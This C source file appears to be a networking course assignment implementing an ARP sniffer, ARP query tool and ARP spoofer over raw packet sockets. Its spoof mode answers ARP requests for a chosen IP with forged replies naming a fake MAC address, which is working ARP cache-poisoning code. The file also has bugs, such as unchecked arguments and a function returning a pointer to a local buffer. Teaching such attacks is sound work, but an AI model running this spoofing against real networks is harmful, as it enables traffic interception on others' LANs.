#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0f5"
//#define DEVICE_NAME "ens33"
#define PACKETSIZE 1500
#define ETH_ALEN 6
#define IP_ADDR_LEN 4

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

int main(int argc, char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req_index,req_ip,req_mac;
	//struct in_addr myip;
	
	struct arp_packet arp_recv,arp_send;
	char ip_1[16],ip_2[16],mac_1[18];
	u_int8_t arp_pac[PACKETSIZE];
	u_int8_t emptymac[ETH_ALEN]={0x00,0x00,0x00,0x00,0x00,0x00};
	u_int8_t broacastmac[ETH_ALEN]={0xff,0xff,0xff,0xff,0xff,0xff};
	unsigned char source_ip[IP_ADDR_LEN] = {0},target_ip[IP_ADDR_LEN] = {0};
		
	if(getuid()!=0 || geteuid()!=0){
		printf("ERROR: You must be root to use this tool!\n");
		exit(1);
	}
	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
		perror("open recv socket error");
		exit(1);
	}
	
	else if(strcmp(argv[1],"-h")==0 || strcmp(argv[1],"-help")==0){			
		printf("[ ARP sniffer and spoof program ]\n");
		printf("Format :\n");
		printf("1) ./arp -l -a\n");
		printf("2) ./arp -l <filter_ip_address>\n");
		printf("3) ./arp -q <query_ip_address>\n");
		printf("4) ./arp <fake_mac_address> <target_ip_address>\n");		
	}

	else if(strcmp(argv[1],"-l")==0){
		printf("[ ARP sniffer and spoof program ]\n");
		printf("### ARP sniffer mode ###\n");
		
		/*
		* Use recvfrom function to get packet.
		* recvfrom( ... )
		*/
		//recvfrom(int sockfd, void *buf, int len, unsigned int flags, struct sockaddr *from, int *fromlen);
		while(1){
		if(recvfrom(sockfd_recv, (void *)&arp_recv, sizeof(struct arp_packet), 0, NULL, NULL) <0){
			perror("recvfrom error");
			exit(1);
		}
		memcpy(arp_pac, (void *)&arp_recv, sizeof(struct arp_packet));
		if(arp_pac[12]==8 && arp_pac[13]==6){ //filter ARP (0x0806)
			if(strcmp(argv[2],"-a")==0){
				strcpy(ip_1,get_target_protocol_addr(&arp_recv.arp));
				strcpy(ip_2,get_sender_protocol_addr(&arp_recv.arp));
				printf("Get ARP packet - Who has %s ?\t Tell %s \n", ip_1, ip_2);
			}
			else if(strlen(argv[2])>=7 && strlen(argv[2])<=15){
				strcpy(ip_1,get_target_protocol_addr(&arp_recv.arp));
				strcpy(ip_2,get_sender_protocol_addr(&arp_recv.arp));
				if(strcmp(argv[2],ip_1)==0)
					printf("Get ARP packet - Who has %s ?\t Tell %s \n", ip_1, ip_2);
			}
			else{
				printf("\n Undefined Error. \n");
				print_usage();
				exit(1);
			}
		}
		}
	}	
	
	else if(strcmp(argv[1],"-q")==0){
		// Open a send socket in data-link layer.
		if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){		
			perror("open send socket error");
			exit(sockfd_send);
		}
		
		if(strlen(argv[2])>=7 && strlen(argv[2])<=15){
			printf("[ ARP sniffer and spoof program ]\n");
			printf("### ARP query mode ###\n");
			
			//set name of index,ip,mac
			memset(&req_index,0,sizeof(req_index));
			memcpy(req_index.ifr_name,DEVICE_NAME,strlen(DEVICE_NAME));
				
			memset(&req_ip,0,sizeof(req_ip));
			memcpy(req_ip.ifr_name,DEVICE_NAME,strlen(DEVICE_NAME));			
				
			memset(&req_mac,0,sizeof(req_mac));
			memcpy(req_mac.ifr_name,DEVICE_NAME,strlen(DEVICE_NAME));
			
			/*
			* Use ioctl function binds the send socket and the Network Interface Card.
`	 		* ioctl( ... )
			*/	
			//ioctl(int fd, unsigned long request, ...);
			
			//save the index of interface to ifr_ifindex
			if(ioctl(sockfd_send, SIOCGIFINDEX, &req_index) == -1){
				perror("ioctl() get index error\n");
				exit(1);
			}
			//get the ip address of interface
			if(ioctl(sockfd_send, SIOCGIFADDR, &req_ip) == -1){
				perror("ioctl() get ip error\n");
				exit(1);
			}
			//get the mac address
			if(ioctl(sockfd_send, SIOCGIFHWADDR, &req_mac) == -1){
				perror("ioctl() get mac error\n");
				exit(1);
			}

			//set broadcast destination
			memset(arp_send.eth_hdr.ether_dhost, 0xff, ETH_ALEN);
			memcpy(arp_send.eth_hdr.ether_shost,req_mac.ifr_hwaddr.sa_data,ETH_ALEN);
			
			arp_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP); //ETHERTYPE_ARP:0x0806

			set_hard_type(&arp_send.arp, htons(0x0001)); //Ethernet hardware
			set_prot_type(&arp_send.arp, htons(0x0800)); //IP packet
			set_hard_size(&arp_send.arp, ETH_ALEN);
			set_prot_size(&arp_send.arp, IP_ADDR_LEN);
			set_op_code(&arp_send.arp, htons(0x0001)); //request

			memcpy(arp_send.arp.arp_sha,req_mac.ifr_hwaddr.sa_data,ETH_ALEN);
			memcpy(source_ip,req_ip.ifr_addr.sa_data+2,IP_ADDR_LEN);
			memcpy(arp_send.arp.arp_spa,source_ip,IP_ADDR_LEN);
			memcpy(arp_send.arp.arp_tha,emptymac,ETH_ALEN);
			
			set_target_protocol_addr(&arp_send.arp, argv[2]);			
			
				
			// Fill the parameters of the sa.
			bzero(&sa,sizeof(sa));
			sa.sll_family = AF_PACKET;
			sa.sll_ifindex = req_index.ifr_ifindex;
			sa.sll_halen = ETH_ALEN;
			sa.sll_protocol = htons(ETH_P_ARP);
			memcpy(sa.sll_addr,mac_1,ETH_ALEN);			
			
			/*
			* use sendto function with sa variable to send your packet out
			* sendto( ... )
			*/	
			//sendto(int sockfd, const void *msg, int len, unsigned int flags, const struct sockaddr *to, socklen_t tolen);
			if(sendto(sockfd_send, &arp_send, sizeof(arp_send),0, (struct sockaddr *)&sa, sizeof(sa)) <0){
				perror("sendto error");
				//exit(1);			
			}
			close(sockfd_send);
			
			while(1){
				int sa_len = sizeof(sa);
				if(recvfrom(sockfd_recv, (void *)&arp_recv, sizeof(struct arp_packet), 0, (struct sockaddr *)&sa, (socklen_t *)&sa_len) <0){
					perror("recvfrom error");
					exit(1);
				}
				//arp & received packet = reply & compare ip
				else if(ntohs(arp_recv.eth_hdr.ether_type)==ETHERTYPE_ARP && arp_recv.arp.arp_op == htons(0x0002) && memcmp(arp_recv.arp.arp_spa, arp_send.arp.arp_tpa, 4) == 0){
					printf("MAC address of %u.%u.%u.%u is at %02x:%02x:%02x:%02x:%02x:%02x\n",
					arp_recv.arp.arp_spa[0], 
					arp_recv.arp.arp_spa[1], 
					arp_recv.arp.arp_spa[2], 
					arp_recv.arp.arp_spa[3],
					arp_recv.arp.arp_sha[0], 
					arp_recv.arp.arp_sha[1], 
					arp_recv.arp.arp_sha[2], 
					arp_recv.arp.arp_sha[3], 
					arp_recv.arp.arp_sha[4], 
					arp_recv.arp.arp_sha[5]);
					break;
				}
			}			
		}
	}
	
	else if(strcmp(argv[1],"00:11:22:33:44:55")==0){
		// Open a recv socket in data-link layer.
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open recv socket error");
			exit(1);
		}
		
		if(strlen(argv[2])>=7 && strlen(argv[2])<=15){
			printf("[ ARP sniffer and spoof program ]\n");
			printf("### ARP spoof mode ###\n");
			
			while(1){
				if(recvfrom(sockfd_recv, (void *)&arp_recv, sizeof(struct arp_packet), 0, NULL, NULL) <0){
					perror("recvfrom error");
					exit(1);
				}
			
				memcpy(arp_pac, (void *)&arp_recv, sizeof(struct arp_packet));
			
				if(arp_pac[12]==8 && arp_pac[13]==6){
					memcpy(&mac_1,get_sender_hardware_addr(&arp_recv.arp),18);
					strcpy(ip_1,get_target_protocol_addr(&arp_recv.arp));
					strcpy(ip_2,get_sender_protocol_addr(&arp_recv.arp)); 
				
					if(strcmp(argv[2],ip_1)==0){
						if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){		
							perror("open send socket error");
							exit(sockfd_send);
						}
					
						set_ethernet_dst_addr(&arp_send.eth_hdr,mac_1);
						set_ethernet_src_addr(&arp_send.eth_hdr,argv[1]);
						arp_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
					
						set_hard_type(&arp_send.arp, htons(0x0001));
						set_prot_type(&arp_send.arp, htons(0x0800));
						set_hard_size(&arp_send.arp, ETH_ALEN);
						set_prot_size(&arp_send.arp, IP_ADDR_LEN);
						set_op_code(&arp_send.arp, htons(0x0002)); //reply
					
						set_sender_hardware_addr(&arp_send.arp, argv[1]);
						set_sender_protocol_addr(&arp_send.arp, ip_1);
						set_target_hardware_addr(&arp_send.arp, mac_1);
						set_target_protocol_addr(&arp_send.arp, ip_2);
					
						memset(&req_index,0,sizeof(req_index));
						memcpy(req_index.ifr_name,DEVICE_NAME,strlen(DEVICE_NAME));
					
						if(ioctl(sockfd_send, SIOCGIFINDEX, &req_index) == -1){
							perror("ioctl() get index error\n");
							exit(1);
						}
					
						// Fill the parameters of the sa.
						bzero(&sa,sizeof(sa));
						sa.sll_family = AF_PACKET;
						sa.sll_ifindex = req_index.ifr_ifindex;
						sa.sll_halen = ETH_ALEN;
						sa.sll_protocol = htons(ETH_P_ARP);
						memcpy(sa.sll_addr,mac_1,ETH_ALEN);
					
						if(sendto(sockfd_send, &arp_send, sizeof(arp_send),0, (struct sockaddr *)&sa, sizeof(sa)) <0){
							perror("sendto error");
						}
						else{
							printf("Get ARP packet - Who has %s ?\t Tell %s \n", ip_1, ip_2);
							printf("Send ARP Reply : %u.%u.%u.%u is at %02x:%02x:%02x:%02x:%02x:%02x\n",
							arp_send.arp.arp_spa[0], 
							arp_send.arp.arp_spa[1], 
							arp_send.arp.arp_spa[2], 
							arp_send.arp.arp_spa[3],
	            			arp_send.arp.arp_sha[0], 
	            			arp_send.arp.arp_sha[1], 
	            			arp_send.arp.arp_sha[2], 
	            			arp_send.arp.arp_sha[3], 
	            			arp_send.arp.arp_sha[4], 
	            			arp_send.arp.arp_sha[5]);
							printf("Send successful.\n");
						}
					break;
					}
				}
			}
		}
	}	
	return 0;
}

//Ethernet header
void set_ethernet_dst_addr(struct ether_header *packet, char *address)
{
	struct ether_addr eth_dst_addr;
	ether_aton_r(address, &eth_dst_addr);
	memcpy(packet->ether_dhost, &eth_dst_addr, 6);
}
void set_ethernet_src_addr(struct ether_header *packet, char *address)
{
	struct ether_addr eth_src_addr;
	ether_aton_r(address, &eth_src_addr);
	memcpy(packet->ether_shost, &eth_src_addr, 6);
}

//fixed size
void set_hard_type(struct ether_arp *packet, unsigned short int type)
{
	packet->arp_hrd = type;
}
void set_prot_type(struct ether_arp *packet, unsigned short int type)
{
	packet->arp_pro = type;
}
void set_hard_size(struct ether_arp *packet, unsigned char size)
{
	packet->arp_hln = size;
}
void set_prot_size(struct ether_arp *packet, unsigned char size)
{
	packet->arp_pln = size;
}
void set_op_code(struct ether_arp *packet, short int code)
{
	packet->arp_op = code;
}

//variable size
void set_sender_hardware_addr(struct ether_arp *packet, char *address)
{
	struct ether_addr src_addr;
	ether_aton_r(address, &src_addr);
	memcpy(packet->arp_sha, &src_addr, packet->ea_hdr.ar_hln);
}
void set_sender_protocol_addr(struct ether_arp *packet, char *address)
{
	in_addr_t src_ip;
	src_ip = inet_addr(address);
	memcpy(packet->arp_spa, &src_ip , packet->ea_hdr.ar_pln);
}
void set_target_hardware_addr(struct ether_arp *packet, char *address)
{
	struct ether_addr dst_addr;
	ether_aton_r(address, &dst_addr);
	memcpy(packet->arp_tha, &dst_addr, packet->ea_hdr.ar_hln);	
}
void set_target_protocol_addr(struct ether_arp *packet, char *address)
{
	in_addr_t dst_ip;
	dst_ip = inet_addr(address);
	memcpy(packet->arp_tpa, &dst_ip, packet->ea_hdr.ar_pln);
}

char* get_target_protocol_addr(struct ether_arp *packet)
{
	// if you use malloc, remember to free it.
	struct in_addr dstip;
	memcpy(&dstip, packet->arp_tpa, 4);
	return inet_ntoa(dstip);
}
char* get_sender_protocol_addr(struct ether_arp *packet)
{
	// if you use malloc, remember to free it.
	struct in_addr srcip;
	memcpy(&srcip, packet->arp_spa, 4);
	return inet_ntoa(srcip);
}
char* get_sender_hardware_addr(struct ether_arp *packet)
{
	// if you use malloc, remember to free it.
	struct ether_addr srcmac;
	char src_mac[18];
	memcpy(&srcmac, packet->arp_sha, 6);
	return ether_ntoa_r(&srcmac,src_mac);
}
char* get_target_hardware_addr(struct ether_arp *packet)
{
	// if you use malloc, remember to free it.
	/*struct ether_addr dstmac;
	memcpy(&dstmac, packet->arp_tha, IP_ADDR_LEN);
	return ether_aton(dstmac);*/
}

void print_usage(){
	printf("1) ./arp -help\n");
	printf("2) ./arp -l -a\n");
	printf("3) ./arp -l <filter_ip_address>\n");
	printf("4) ./arp -q <query_ip_address>\n");
	printf("5) ./arp <fake_mac_address> <target_ip_address>\n");
}